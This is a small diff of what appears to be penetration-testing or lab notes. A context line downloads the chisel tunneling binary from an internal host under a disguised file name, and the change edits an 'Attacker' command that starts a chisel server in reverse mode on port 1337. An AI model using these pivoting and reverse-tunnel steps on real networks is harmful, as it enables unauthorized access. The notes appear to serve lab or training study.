@@ -184,6 +184,8 @@ curl 10.50.106.240/chisel_1.9.1_linux_amd64  -o chisel-sardarji
 
 ```
 Attacker
-./client server -p 1337 --reverse &
+./chisel_1.9.1_linux_amd64 server -p 1337 --reverse & 
 ```
+
+![[Pasted image 20240727174405.png]]
 
